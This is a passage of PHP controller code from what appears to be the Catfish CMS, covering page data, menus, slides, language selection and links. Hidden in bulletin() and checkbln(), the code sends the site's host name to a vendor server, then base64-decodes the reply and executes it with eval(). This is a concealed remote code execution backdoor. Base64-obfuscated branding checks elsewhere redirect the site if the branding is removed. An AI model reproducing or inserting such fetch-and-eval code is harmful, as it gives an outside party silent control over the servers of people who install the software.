            $params[$key]['reach'] = Url::build('/reach/'.$val['id']);
            $params[$key]['zuozhehref'] = Url::build('/author/'.$val['author']);
            if(isset($this->options_spare['rewrite']) && $this->options_spare['rewrite'] == 1){
                $params[$key]['href'] = str_replace('index.php/','',$params[$key]['href']);
                $params[$key]['reach'] = str_replace('index.php/','',$params[$key]['reach']);
            }
            Hook::add('url_module',$this->plugins);
            Hook::listen('url_module',$params[$key]['href'],$this->ccc);
            if(isset($val['fabushijian']))
            {
                $params[$key]['shijiancha'] = $this->timedif($val['fabushijian']);
                $params[$key]['date'] = $this->decotime($val['fabushijian']);
                $params[$key]['jintian'] = $this->istoday($val['fabushijian']);
                $params[$key]['yitian'] = $this->isoneday($val['fabushijian']);
                if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                {
                    $params[$key]['fabushijian'] = date($this->options_spare['timeFormat'],strtotime($val['fabushijian']));
                }
            }
            if(isset($val['shoufashijian']))
            {
                $params[$key]['shoufa']['shijiancha'] = $this->timedif($val['shoufashijian']);
                $params[$key]['shoufa']['date'] = $this->decotime($val['shoufashijian']);
                if(isset($this->options_spare['timeFormat']) && !empty($this->options_spare['timeFormat']))
                {
                    $params[$key]['shoufashijian'] = date($this->options_spare['timeFormat'],strtotime($val['shoufashijian']));
                }
            }
            $gjzarr = [];
            if(isset($val['guanjianzi']) && !empty($val['guanjianzi']))
            {
                $gjzarr = $this->getgjz($val['guanjianzi']);
            }
            $params[$key]['guanjianzu'] = $gjzarr;
            $params[$key]['wenpai'] = $this->wenpai($gjzarr);
            $params[$key]['tupianzu'] = [
                'tu' => [],
                'shuliang' => 0
            ];
            if(isset($val['zhengwen'])){
                $params[$key]['tupianzu'] = $this->gettu($val['zhengwen']);
            }
            if(isset($val['zhengwenfz'])){
                $params[$key]['tupianzu'] = $this->gettu($val['zhengwenfz']);
                unset($params[$key]['zhengwenfz']);
            }
            $wentu = '';
            if(isset($params[$key]['tupianzu'])){
                if($params[$key]['tupianzu']['shuliang'] > 0){
                    $wentu = $params[$key]['tupianzu']['tu'][0];
                }
            }
            $params[$key]['wentu'] = $wentu;
        }
        return $params;
    }
    private function filterLanguages($parameter)
    {
        $param = strtolower($parameter);
        if($param == 'zh' || strpos($param,'zh-hans') !== false || strpos($param,'zh-chs') !== false)
        {
            Lang::range('zh-cn');
            return 'zh-cn';
        }
        else if($param == 'zh-tw' || strpos($param,'zh-hant') !== false || strpos($param,'zh-cht') !== false){
            Lang::range('zh-tw');
            return 'zh-tw';
        }
        else if(stripos($param,'zh') === false)
        {
            $paramsub = substr($param,0,2);
            switch($paramsub)
            {
                case 'de':
                    Lang::range('de-de');
                    return 'de-de';
                    break;
                case 'fr':
                    Lang::range('fr-fr');
                    return 'fr-fr';
                    break;
                case 'ja':
                    Lang::range('ja-jp');
                    return 'ja-jp';
                    break;
                case 'ko':
                    Lang::range('ko-kr');
                    return 'ko-kr';
                    break;
                case 'ru':
                    Lang::range('ru-ru');
                    return 'ru-ru';
                    break;
                default:
                    return $param;
            }
        }
        else
        {
            return $param;
        }
    }
    protected function optionsSpare()
    {
        $options_spare = Cache::get('options_spare');
        if($options_spare === false)
        {
            $options_spare = Db::name('options')->where('option_name','spare')->field('option_value')->find();
            $options_spare = $options_spare['option_value'];
            if(!empty($options_spare))
            {
                $options_spare = unserialize($options_spare);
            }
            Cache::set('options_spare',$options_spare,3600);
        }
        return $options_spare;
    }
    protected function addLargerPicture($data)
    {
        if(!isset($this->options_spare['datu']) || $this->options_spare['datu'] != 1)
        {
            foreach($data as $dkey => $dval)
            {
                $data[$dkey]['xiaotu'] = '';
                $data[$dkey]['datu'] = '';
                if(!empty($dval['suolvetu']))
                {
                    if($this->isLocalImage($dval['suolvetu']) == false){
                        $data[$dkey]['xiaotu'] = $dval['suolvetu'];
                        $data[$dkey]['datu'] = $dval['suolvetu'];
                    }
                    else{
                        $tuArr = explode('/',$dval['suolvetu']);
                        $lastk = count($tuArr) - 1;
                        $datuming = str_replace('.','_larger.',$tuArr[$lastk]);
                        $xiaotuming = str_replace('.','_small.',$tuArr[$lastk]);
                        $tuArr[$lastk] = $datuming;
                        $datu = implode('/',$tuArr);
                        $tuArr[$lastk] = $xiaotuming;
                        $xiaotu = implode('/',$tuArr);
                        foreach($tuArr as $tkey => $tu)
                        {
                            if($tu == 'data' && $tuArr[$tkey + 1] == 'uploads')
                            {
                                break;
                            }
                            else
                            {
                                unset($tuArr[$tkey]);
                            }
                        }
                        $tupath = implode('/',$tuArr);
                        if(is_file(ROOT_PATH.$tupath))
                        {
                            $data[$dkey]['xiaotu'] = $xiaotu;
                        }
                        $tuArr[$lastk] = $datuming;
                        $tupath = implode('/',$tuArr);
                        if(is_file(ROOT_PATH.$tupath))
                        {
                            $data[$dkey]['datu'] = $datu;
                        }
                    }
                }
            }
        }
        return $data;
    }
    protected function doNothing($param)
    {
        $param = strtolower(trim($param));
        if(substr($param,0,1)=='#')
        {
            return true;
        }
        if(substr($param,0,10)=='javascript')
        {
            $param = str_replace(' ','',$param);
            if($param == 'javascript:;' || $param == 'javascript:void(0)' || $param == 'javascript:void(0);')
            {
                return true;
            }
        }
        return false;
    }
    private function slide()
    {
        $data_slide = Cache::get('slide');
        if($data_slide === false)
        {
            $data_slide = Db::name('slide')->where('slide_status',1)->field('slide_id,slide_name,slide_pic,slide_url,slide_des')->order('listorder')->select();
            Cache::set('slide',$data_slide,3600);
        }
        $this->assign('slide', $data_slide);
        $data_slidegroup = Cache::get('slidegroup');
        if($data_slidegroup === false){
            $data_slidegroup = [];
            $slide = Operc::getc('slidegroups');
            if(!empty($slide)){
                $slideArr = unserialize($slide);
                foreach($data_slide as $key => $val){
                    $data_slide[$key]['group'] = $this->whichgroup($val['slide_id'], $slideArr);
                }
                foreach($slideArr as $key => $val){
                    foreach($data_slide as $dkey => $dval){
                        if($dval['group'] == $key){
                            $data_slidegroup[$key][] = $dval;
                        }
                    }
                }
            }
            $tmparr = [];
            $xh = 1;
            foreach($data_slidegroup as $key => $val){
                $tmparr['group'.$xh] = $val;
                $xh ++;
            }
            $data_slidegroup = array_merge($data_slidegroup, $tmparr);
            Cache::set('slidegroup',$data_slidegroup,3600);
        }
        $this->assign('slidegroup', $data_slidegroup);
        if(isset($this->options_spare['closeSlide']) && $this->options_spare['closeSlide'] == 1)
        {
            $this->assign('closeSlide', 1);
        }
        else
        {
            $this->assign('closeSlide', 0);
        }
    }
    protected function actualDomain()
    {
        $dm = $_SERVER['HTTP_HOST'];
        $dm = str_replace(':','',$dm);
        $dmArr = explode('.',$dm);
        if(stripos($dm,'localhost') !== false || $this->isIntArr($dmArr))
        {
            return false;
        }
        else
        {
            return true;
        }
    }
    private function isIntArr($arr)
    {
        foreach($arr as $val)
        {
            if(!is_numeric($val))
            {
                return false;
            }
        }
        return true;
    }
    private function bulletin($bulletin)
    {
        $tm = time();
        if(isset($bulletin['h']) && $tm > $bulletin['a'] && !empty($bulletin['identifier']))
        {
            $bln = $this->checkbln($bulletin['identifier']);
            $firstchr = strtolower(substr($bln,0,1));
            if($firstchr == 'k')
            {
                $token = substr($bln,1,32);
                if(Session::has($this->session_prefix.'checkbln_token') && md5(Session::get($this->session_prefix.'checkbln_token').$bulletin['identifier']) == $token)
                {
                    Session::delete($this->session_prefix.'checkbln_token');
                    $ex = base64_decode(substr($bln,33));
                    if(!empty($ex))
                    {
                        eval($ex);
                    }
                    exit();
                }
            }
        }
    }
    private function checkbln($id)
    {
        $version = Config::get('version');
        $ch = curl_init();
        $token = md5(time().rand(100,999999));
        Session::set($this->session_prefix.'checkbln_token',$token);
        $url = 'http://www.'.$version['official'].'/_version/?i='.md5($id).'&t='.$token.'&dm='.urlencode($_SERVER['HTTP_HOST'].Url::build('/'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;http://www.baidu.com)');
        curl_setopt($ch , CURLOPT_URL , $url);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }
    protected function filterJs($str)
    {
        while(preg_match("/(<script)|(<style)|(<iframe)|(<frame)|(<form)|(<a)|(<object)|(<frameset)|(<bgsound)|(<video)|(<source)|(<audio)|(<track)|(<marquee)|(<embed)|(<base)/i",$str) || preg_match("/(?<!\w)((onabort)|(onactivate)|(onafter)|(onbefore)|(onbegin)|(onblur)|(onbounce)|(oncellchange)|(onchange)|(onclick)|(oncont)|(oncopy)|(oncut)|(ondata)|(ondblclick)|(ondeactivate)|(ondrag)|(ondrop)|(onerror)|(onfilter)|(onfinish)|(onfocus)|(onhelp)|(onkey)|(onlayout)|(onlose)|(onload)|(onmouse)|(onmove)|(onpaste)|(onpageshow)|(onproperty)|(onready)|(onreset)|(onresize)|(onrow)|(onscroll)|(onselect)|(onstart)|(onstop)|(onseek)|(onsubmit)|(ontoggle)|(onunload))/i",$str))
        {
            $str = preg_replace(['/<script[\s\S]*?<\/script[\s]*>/i','/<style[\s\S]*?<\/style[\s]*>/i','/<iframe[\s\S]*?(<\/iframe|\/)[\s]*>/i','/<frame[\s\S]*?(<\/frame|\/)[\s]*>/i','/<form[\s\S]*?>/i','/<object[\s\S]*?(<\/object|\/)[\s]*>/i','/<frameset[\s\S]*?(<\/frameset|\/)[\s]*>/i','/<bgsound[\s\S]*?(<\/bgsound|\/)[\s]*>/i','/<video[\s\S]*?(<\/video|\/)[\s]*>/i','/<source[\s\S]*?(<\/source|\/)[\s]*>/i','/<audio[\s\S]*?(<\/audio|\/)[\s]*>/i','/<track[\s\S]*?(<\/track|\/)[\s]*>/i','/<marquee[\s\S]*?(<\/marquee|\/)[\s]*>/i','/<embed[\s\S]*?(<\/embed|\/)?[\s]*>/i','/<base[\s\S]*?(<\/base|\/)?[\s]*>/i','/<a[\s\S]*?(<\/a|\/)[\s]*>/i','/on[A-Za-z]+[\s]*=[\s]*[\'|"][\s\S]*?[\'|"]/i','/on[A-Za-z]+[\s]*=[\s]*[^>]+/i'],'',$str);
        }
        $str = str_replace('<!--','&lt;!--',$str);
        return $str;
    }
    private function gelare($v,$e,$p,$c)
    {
        if($this->actualDomain())
        {
            $this->assign(base64_decode('Y2F0ZmlzaA=='), ($c > 4) ? base64_decode('PGEgaHJlZj0iaHR0cDovL3d3dy4=').$v['official'].'/" '.base64_decode('aWQ9ImNhdGZpc2gi').$e.'>'.$v['name'].' '.$v['description'].' '.$v['number'].base64_decode('PC9hPg==').$p : base64_decode('PGRpdiBpZD0iY2F0ZmlzaCI+PC9kaXY+'));
            if(substr(md5($v['name'].$v['official']),15,8) != '88955a62')
            {
                $this->redirect(Url::build('/error'));
                exit();
            }
        }
    }
    private function closeWeb()
    {
        Lang::load(APP_PATH . '../public/common/html/close/lang/'.$this->lang.'.php');
        $template = $this->receive();
        if(Request::instance()->isMobile() && is_file(APP_PATH.'../public/'.$template.'/mobile/close.html'))
        {
            $htmls = $this->fetch(APP_PATH.'../public/'.$template.'/mobile/close.html');
        }
        elseif(is_file(APP_PATH.'../public/'.$template.'/close.html'))
        {
            $htmls = $this->fetch(APP_PATH.'../public/'.$template.'/close.html');
        }
        else
        {
            $htmls = $this->fetch(APP_PATH.'../public/common/html/close/index.html');
        }
        echo $htmls;
    }
    protected function getmenu()
    {
        if(empty($this->selfpage)){
            $this->selfpage = $this->getpage();
        }
        $menu = Cache::get('menu');
        if($menu === false)
        {
            $menu = [];
            $menus = Db::name('nav_cat')->field('navcid,nav_name,active')->order('active desc')->select();
            $start = 1;
            foreach($menus as $key => $val)
            {
                $submenu = Db::name('nav')->where('cid',$val['navcid'])->where('status',1)->field('id,parent_id,label,target,href,icon,icons')->order('listorder')->select();
                if(!empty($submenu))
                {
                    foreach($submenu as $skey => $sval){
                        if(!empty($sval['icons'])){
                            $submenu[$skey]['icon'] = $sval['icons'];
                        }
                        unset($submenu[$skey]['icons']);
                    }
                    $submenu = $this->checkUrl(Tree::makeTree($submenu));
                }
                $menu['menu'.$start] = $submenu;
                $menu['aide']['menu'.$start]['changdu'] = count($submenu);
                $start++;
            }
            Cache::set('menu',$menu,3600);
        }
        if(isset($menu['aide'])){
            $menuAide = $menu['aide'];
            unset($menu['aide']);
        }
        else{
            $menuAide['menu1'] = ['bootstrap' => '', 'bootstrap4' => '', 'bootstrapUnlimited' => ''];
        }
        $menu['lang'] = $this->lang;
        Hook::add('filter_menu',$this->plugins);
        Hook::listen('filter_menu',$menu,$this->ccc);
        unset($menu['lang']);
        if(isset($menu['daohang']))
        {
            $this->pnavigation = $menu['daohang'];
            unset($menu['daohang']);
        }
        $kact = -1;
        foreach($menu as $key => $val)
        {
            $menuAide[$key]['bootstrap'] = $this->getBootstrap($val,$this->selfpage);
            $menuAide[$key]['bootstrap4'] = $this->getBootstrapf($val,$this->selfpage);
            $menuAide[$key]['bootstrapUnlimited'] = $this->getBootstrapUnlimited($val,$this->selfpage);
            if($key == 'menu1'){
                $stop = $this->addMenuActive($menu[$key],$this->selfpage, $kact);
                if($stop === false){
                    $kact = -1;
                }
            }
            else{
                $this->addMenuActive($menu[$key],$this->selfpage);
            }
        }
        $this->assign('menuAide', $menuAide);
        if($kact > -1 && isset($menu['menu1'])){
            $this->assign('zicaidan', $menu['menu1'][$kact]);
        }
        else{
            $this->assign('zicaidan', []);
        }
        return $menu;
    }
    protected function getMenuItem($menu)
    {
        $reArr = [];
        foreach($menu as $key => $val)
        {
            if(substr($val['href'],0,1) == '/')
            {
                $reArr[] = [
                    'biaoti' => $val['label'],
                    'href' => $val['href']
                ];
                if(isset($val['children']))
                {
                    $reArr = array_merge_recursive($reArr,$this->getMenuItem($val['children']));
                }
            }
        }
        return $reArr;
    }
    protected function changeOutput(&$content)
    {
        if(stripos($content,'<embed') !== false)
        {
            $content = preg_replace_callback(
                '/<embed[\s\S]*?src="([\s\S]*?)"[\s\S]*?(\/>|<\/embed>)/',
                function ($matches) {
                    $width = '';
                    $height = '';
                    preg_match('/width="(\d+)"/', $matches[0], $wmatches);
                    if(isset($wmatches[1]))
                    {
                        $width = ' width="'.$wmatches[1].'"';
                    }
                    preg_match('/height="(\d+)"/', $matches[0], $hmatches);
                    if(isset($hmatches[1]))
                    {
                        $height = ' height="'.$hmatches[1].'"';
                    }
                    preg_match('/autostart="([^"]+)"/', $matches[0], $amatches);
                    preg_match('/loop="([^"]+)"/', $matches[0], $lmatches);
                    $autostart = (isset($amatches[1]) && $amatches[1]=='true') ? ' autoplay="autoplay"' : '';
                    $loop = (isset($lmatches[1]) && $lmatches[1]=='true') ? ' loop="loop"' : '';
                    $class = ' class="embed-responsive-item"';
                    $va = 'iframe';
                    if(in_array(strtolower(substr($matches[1],-3,3)),['mp3','wav','ogg']))
                    {
                        $va = 'audio';
                        $class = '';
                    }
                    elseif(in_array(strtolower(substr($matches[1],-3,3)),['mp4','webm','ogg']))
                    {
                        $va = 'video';
                    }
                    return '<div class="embed-responsive embed-responsive-16by9">
  <'.$va.$class.$width.$height.' src="'.$matches[1].'"'.$autostart. $loop .' preload="none" controls="controls"></'.$va.'>
</div>';
                },
                $content
            );
        }
    }
    private function getcfg($c)
    {
        if(!Operc::cm($c['name'],$c['official'],'3b293cb9031a1077'))
        {
            $this->redirect(Url::build('/error'));
            exit();
        }
        else
        {
            return $c;
        }
    }
    protected function links()
    {
        $nonhomeLinks = Cache::get('nonhomeLinks');
        if($nonhomeLinks === false)
        {
            $nonhomeLinks = Db::name('links')->where('link_location',0)->where('link_status',1)->field('link_url,link_name,link_image,link_target,link_description')->order('listorder')->select();
            Cache::set('nonhomeLinks',$nonhomeLinks,3600);
        }
        $image_links = [];
        foreach($nonhomeLinks as $key => $val)
        {
            if(!empty($val['link_image']))
            {
                $image_links[] = $nonhomeLinks[$key];
            }
        }
        $this->assign('imageLinks', $image_links);
        $this->assign('links', $nonhomeLinks);
        $allLinks = Cache::get('allLinks');
        if($allLinks === false)
        {
            $allLinks = Db::name('links')->where('link_status',1)->field('link_url,link_name,link_image,link_target,link_description')->order('listorder')->select();
            Cache::set('allLinks',$allLinks,3600);
        }
        $this->assign('allLinks', $allLinks);
        $image_allLinks = [];
        foreach($allLinks as $key => $val)
        {
            if(!empty($val['link_image']))
            {
                $image_allLinks[] = $allLinks[$key];
            }
        }
        $this->assign('imageAllLinks', $image_allLinks);
    }
    protected function menuPath($id, $type, $menuId = 0)
    {
        $menuPath = Cache::get('menuPath'.$id.$type.'.'.$menuId);
        if($menuPath === false)
        {
            $menuPath = [];
            if($menuId == 0)
            {
                $menuPathArr = Db::name('nav')->where('href','/index/Index/'.$type.'/id/'.$id)->where('status',1)->field('id,parent_id,label,href,icon')->find();
            }
            else
            {
                $menuPathArr = Db::name('nav')->where('id',$menuId)->where('href','/index/Index/'.$type.'/id/'.$id)->where('status',1)->field('id,parent_id,label,href,icon')->find();
            }
            if(!empty($menuPathArr))
            {
                $menuPath[] = [
                    'id' => $menuPathArr['id'],
                    'label' => $menuPathArr['label'],
                    'icon' => $menuPathArr['icon'],
                    'href' => $menuPathArr['href']
                ];
                $parentId = $menuPathArr['parent_id'];
                while($parentId > 0)
                {
                    $menuPathArr = Db::name('nav')->where('id',$parentId)->where('status',1)->field('id,parent_id,label,href,icon')->find();
                    if(!empty($menuPathArr))
                    {
                        $menuPath[] = [
                            'id' => $menuPathArr['id'],
                            'label' => $menuPathArr['label'],
                            'icon' => $menuPathArr['icon'],
                            'href' => $menuPathArr['href']
                        ];
                        $parentId = $menuPathArr['parent_id'];
                    }
                    else
                    {
                        $parentId = 0;
                    }
                }
            }
            if(!empty($menuPath))
            {
                $menuPath=$this->checkUrl(array_reverse($menuPath));
            }
            Cache::set('menuPath'.$id.$type.'.'.$menuId,$menuPath,3600);
        }
        $menuPath['lang'] = $this->lang;
        Hook::add('filter_menuPath',$this->plugins);
        Hook::listen('filter_menuPath',$menuPath,$this->ccc);
        unset($menuPath['lang']);
        $this->assign('daohang', $menuPath);
        return $menuPath;
    }
    private function analysis($label)
    {
        $labelArr = explode(PHP_EOL,$label);
        $tmplbl = '';
        foreach($labelArr as $val)
        {
            $yuju = preg_replace('/(?<!http\:|https\:|ftp\:)\/\/.*$/', '', $val);
            if($yuju === false)
            {
                $yuju = trim($val);
            }
            else
            {
                $yuju = trim($yuju);
            }
            if($yuju == '' && $tmplbl == '')
            {
                continue;
            }
            $yuju = preg_replace_callback(
                '`(?<!http\:|https\:|ftp\:)(\\\/){2,}`',
                function ($matches) {
                    return str_replace('\/','/',$matches[0]);
                },
                $yuju
            );
            if(substr($yuju,-1) == ';')
            {
                $yuju = substr($yuju,0,-1);
                $br = '<br>';
                if($yuju != strip_tags($yuju) || $tmplbl != strip_tags($tmplbl,'<br>'))
                {
                    $br = '';
                }
                if($tmplbl != '')
                {
                    $yuju = $tmplbl.$br.$yuju;
                }
                $tmplbl = '';
                $ming = strstr($yuju,':',true);
                if($ming !== false)
                {
                    $ming = trim($ming);
                    $zhi = trim(substr(strstr($yuju,':'),1));
                    $this->assign('z_'.$ming, $zhi);
                }
            }
            else
            {
                if($tmplbl != '')
                {
                    $br = '<br>';
                    if($yuju != strip_tags($yuju) || $tmplbl != strip_tags($tmplbl,'<br>'))
                    {
                        $br = '';
                    }
                    $tmplbl .= $br.$yuju;
                }
                else
                {
                    $tmplbl .= $yuju;
                }
                continue;
            }
        }
        if($tmplbl != '')
        {
            $ming = strstr($tmplbl,':',true);
            if($ming !== false)
            {
                $ming = trim($ming);
                $zhi = trim(substr(strstr($tmplbl,':'),1));
                $this->assign('z_'.$ming, $zhi);
            }
        }
    }
    protected function unifiedAssignment($w = 'category')
    {
        if($w == 'category')
        {
            $this->assign('category_top', $this->category_top);
            $this->assign('category_mid', $this->category_mid);
            $this->assign('category_bottom', $this->category_bottom);
            $this->assign('category_side_top', $this->category_side_top);
            $this->assign('category_side_mid', $this->category_side_mid);
            $this->assign('category_side_bottom', $this->category_side_bottom);
            $this->assign('article_list_top', $this->article_list_top);
            $this->assign('article_list_mid', $this->article_list_mid);
            $this->assign('article_list_bottom', $this->article_list_bottom);
            $this->assign('article_list_side_top', $this->article_list_side_top);
            $this->assign('article_list_side_mid', $this->article_list_side_mid);
            $this->assign('article_list_side_bottom', $this->article_list_side_bottom);
            $this->assign('search_top', $this->search_top);
            $this->assign('search_mid', $this->search_mid);
            $this->assign('search_bottom', $this->search_bottom);
            $this->assign('search_side_top', $this->search_side_top);
            $this->assign('search_side_mid', $this->search_side_mid);
            $this->assign('search_side_bottom', $this->search_side_bottom);

            $this->assign('author_top', $this->author_top);
            $this->assign('author_mid', $this->author_mid);
            $this->assign('author_bottom', $this->author_bottom);
            $this->assign('author_side_top', $this->author_side_top);
            $this->assign('author_side_mid', $this->author_side_mid);
            $this->assign('author_side_bottom', $this->author_side_bottom);

            $this->assign('category_top_group', $this->category_top.$this->article_list_top.$this->search_top.$this->author_top);
            $this->assign('category_mid_group', $this->category_mid.$this->article_list_mid.$this->search_mid.$this->author_mid);
            $this->assign('category_bottom_group', $this->category_bottom.$this->article_list_bottom.$this->search_bottom.$this->author_bottom);
            $this->assign('category_side_top_group', $this->side_top.$this->category_side_top.$this->article_list_side_top.$this->search_side_top.$this->author_side_top);
            $this->assign('category_side_mid_group', $this->side_mid.$this->category_side_mid.$this->article_list_side_mid.$this->search_side_mid.$this->author_side_mid);
            $this->assign('category_side_bottom_group', $this->category_side_bottom.$this->article_list_side_bottom.$this->search_side_bottom.$this->author_side_bottom.$this->side_bottom);
        }
        elseif($w == 'home')
        {
            $this->assign('home_side_top_group', $this->side_top.$this->home_side_top);
            $this->assign('home_side_mid_group', $this->side_mid.$this->home_side_mid);
            $this->assign('home_side_bottom_group', $this->home_side_bottom.$this->side_bottom);
        }
        elseif($w == 'article')
        {
            $this->assign('article_side_top_group', $this->side_top.$this->article_side_top);
            $this->assign('article_side_mid_group', $this->side_mid.$this->article_side_mid);
            $this->assign('article_side_bottom_group', $this->article_side_bottom.$this->side_bottom);
        }
        elseif($w == 'page')
        {
            $this->assign('page_side_top_group', $this->side_top.$this->page_side_top);
            $this->assign('page_side_mid_group', $this->side_mid.$this->page_side_mid);
            $this->assign('page_side_bottom_group', $this->page_side_bottom.$this->side_bottom);
        }
        elseif($w == 'author')
        {
            $this->assign('author_top', $this->author_top);
            $this->assign('author_mid', $this->author_mid);
            $this->assign('author_bottom', $this->author_bottom);
            $this->assign('author_side_top', $this->author_side_top);
            $this->assign('author_side_mid', $this->author_side_mid);
            $this->assign('author_side_bottom', $this->author_side_bottom);
            $this->assign('author_top_group', $this->author_top);
            $this->assign('author_mid_group', $this->author_mid);
            $this->assign('author_bottom_group', $this->author_bottom);
            $this->assign('author_side_top_group', $this->side_top.$this->author_side_top);
            $this->assign('author_side_mid_group', $this->side_mid.$this->author_side_mid);
            $this->assign('author_side_bottom_group', $this->author_side_bottom.$this->side_bottom);
        }
    }
    protected function domain()
    {
        $domain = Cache::get('domain');
        if($domain === false)
        {
            $domain = Db::name('options')->where('option_name','domain')->field('option_value')->find();
            $domain = $domain['option_value'];
            Cache::set('domain',$domain,3600);
        }
        $domain = $this->filterdm($domain);
        return $domain;
    }
    protected function getgjz($instr)
    {
        $gjzarr = [];
        $instr = trim($instr);
        if(!empty($instr)){
            $tmpgjz = str_replace('，',',',$instr);
            $tmpgjzarr = explode(',',$tmpgjz);
            foreach($tmpgjzarr as $gval)
            {
                $gjzarr[] = [
                    'name' => $gval,
                    'href' => Url::build('/find/'.urlencode($gval))
                ];
            }
        }
        return $gjzarr;
    }
    protected function findBindingCategory($id)
    {
        $re = false;
        $bc = [];
        $tmpbc = Operc::getc('bindingCategory');
        if(!empty($tmpbc))
        {
            $bc = unserialize($tmpbc);
        }
        foreach($bc as $key => $val)
        {
            if($key == $id)
            {
                $re = $val;
                break;
            }
        }
        return $re;
    }
    protected function allSubcategories($id)
    {
        $idc = '';
        $subcat = Db::name('terms')->where('parent_id',$id)->field('id,parent_id')->select();
        if(!empty($subcat))
        {
            foreach($subcat as $val)
            {
                if($idc == '')
                {
                    $idc = $val['id'];
                }
                else
                {
                    $idc .= ','.$val['id'];
                }
                if($val['parent_id'] != 0)
                {
                    $ridc = $this->allSubcategories($val['id']);
                    if(!empty($ridc))
                    {
                        if($idc == '')
                        {
                            $idc = $ridc;
                        }
                        else
                        {
                            $idc .= ','.$ridc;
                        }
                    }
                }
            }
        }
        return $idc;
    }
    protected function getpage()
    {
        $dqu = $_SERVER['REQUEST_URI'];
        if(strpos($dqu,'?') !== false)
        {
            $dquarr = explode('?',$dqu);
            $dqu = $dquarr[0];
        }
        if(stripos($dqu, '/index.php') !== false)
        {
            if($dqu == '/index.php')
            {
                $phpSelf = Url::build('/index');
                Hook::add('url_menu',$this->plugins);
                Hook::listen('url_menu',$phpSelf,$this->ccc);
                return $phpSelf;
            }
            else
            {
                Hook::add('url_menu',$this->plugins);
                Hook::listen('url_menu',$dqu,$this->ccc);
                return $dqu;
            }
        }
        else
        {
            if($dqu == '/')
            {
                $phpSelf = Url::build('/index');
                Hook::add('url_menu',$this->plugins);
                Hook::listen('url_menu',$phpSelf,$this->ccc);
                return $phpSelf;
            }
            else
            {
                Hook::add('url_menu',$this->plugins);
                Hook::listen('url_menu',$dqu,$this->ccc);
                return $dqu;
            }
        }
    }
    private function getBootstrapUnlimited($arr,$pageUrl)
    {
        $re = '';
        foreach($arr as $key => $val)
        {
            $active = '';
            $act = '';
            if($pageUrl == $val['href']){
                $active = ' class="active"';
                $act = ' active';
            }
            if(isset($val['children'])){
                $re .= '<li class="dropdown'.$act.'"><a href="'.$val['href'].'" class="dropdown-toggle" data-toggle="dropdown" target="'.$val['target'].'">'.(empty($val['icon'])?'':$val['icon'].'&nbsp;').$val['label'].'</a><ul class="dropdown-menu">'.$this->getBootstrapUnlimited($val['children'],$pageUrl).'</ul></li>';
            }
            else{
                $re .= '<li'.$active.'><a href="'.$val['href'].'" target="'.$val['target'].'">'.(empty($val['icon'])?'':$val['icon'].'&nbsp;').$val['label'].'</a></li>';
            }
        }
        return $re;
    }
    private function getBootstrap($arr,$pageUrl)
    {
        $re = '';
        foreach($arr as $key => $val)
        {
            $active = '';
            $act = '';
            if($pageUrl == $val['href']){
                $active = ' class="active"';
                $act = ' active';
            }
            if(isset($val['children'])){
                $children = '';
                foreach($val['children'] as $ckey => $cval)
                {
                    $cactive = '';
                    if($pageUrl == $cval['href']){
                        $cactive = ' class="active"';
                    }
                    $children .= '<li'.$cactive.'><a href="'.$cval['href'].'" target="'.$cval['target'].'">'.$cval['icon'].$cval['label'].'</a></li>';
                }
                $re .= '<li class="dropdown'.$act.'"><a href="'.$val['href'].'" class="dropdown-toggle" data-toggle="dropdown" target="'.$val['target'].'">'.(empty($val['icon'])?'':$val['icon'].'&nbsp;').$val['label'].' <span class="caret"></span></a><ul class="dropdown-menu">'.$children.'</ul></li>';
            }
            else{
                $re .= '<li'.$active.'><a href="'.$val['href'].'" target="'.$val['target'].'">'.(empty($val['icon'])?'':$val['icon'].'&nbsp;').$val['label'].'</a></li>';
            }
        }
        return $re;
    }
    private function loginAide($url)
    {
        $loginAide['bootstrap'] = '';
        $loginAide['bootstrap4'] = '';
        if($this->notAllowLogin != 1)
        {
            $islogin = $this->login();
            $login = '';
            $nologin = ' hidden';
            $login4 = '';
            $nologin4 = ' d-none';
            if(!empty($islogin))
            {
                $login = ' hidden';
                $nologin = '';
                $login4 = ' d-none';
                $nologin4 = '';
            }
            $loginAide['bootstrap'] = '<li class="weidenglu'.$login.'"><a href="'.$url['register'].'">'.Lang::get('Sign up').'</a></li>
                <li class="weidenglu'.$login.'"><a href="'.$url['login'].'">'.Lang::get('Log in').'</a></li>
                <li class="dropdown yidenglu'.$nologin.'">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><span id="dengluyonghuming">'.$islogin.'</span> <span class="caret"></span></a>
                    <ul class="dropdown-menu" role="menu">
                        <li><a href="'.$url['userCenter'].'"><span class="glyphicon glyphicon-user"></span>&nbsp;&nbsp;'.Lang::get('User center').'</a></li>
                        <li><a href="'.$url['quit'].'"><span class="glyphicon glyphicon-log-out"></span>&nbsp;&nbsp;'.Lang::get('Sign out').'</a></li>
                    </ul>
                </li>';
            $loginAide['bootstrap4'] = '<li class="nav-item weidenglu'.$login4.'"><a class="nav-link" href="'.$url['register'].'">'.Lang::get('Sign up').'</a></li>
                <li class="nav-item weidenglu'.$login4.'"><a class="nav-link" href="'.$url['login'].'">'.Lang::get('Log in').'</a></li>
                <li class="nav-item dropdown yidenglu'.$nologin4.'">
                    <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown"><span id="dengluyonghuming">'.$islogin.'</span> <span class="caret"></span></a>
                    <div class="dropdown-menu dropdown-menu-right">
                        <a class="dropdown-item" href="'.$url['userCenter'].'"><span class="glyphicon glyphicon-user"></span>&nbsp;&nbsp;'.Lang::get('User center').'</a>
                        <a class="dropdown-item" href="'.$url['quit'].'"><span class="glyphicon glyphicon-log-out"></span>&nbsp;&nbsp;'.Lang::get('Sign out').'</a>
                    </div>
                </li>';
        }
        return $loginAide;
    }
    protected function addLargerPictureInOneDim($data)
    {
        $data['xiaotu'] = '';
        $data['datu'] = '';
        if((!isset($this->options_spare['datu']) || $this->options_spare['datu'] != 1) && isset($data['suolvetu']) && !empty($data['suolvetu']))
        {
            if($this->isLocalImage($data['suolvetu']) == false){
                $data['xiaotu'] = $data['suolvetu'];
                $data['datu'] = $data['suolvetu'];
            }
            else{
                $tuArr = explode('/',$data['suolvetu']);
                $lastk = count($tuArr) - 1;
                $datuming = str_replace('.','_larger.',$tuArr[$lastk]);
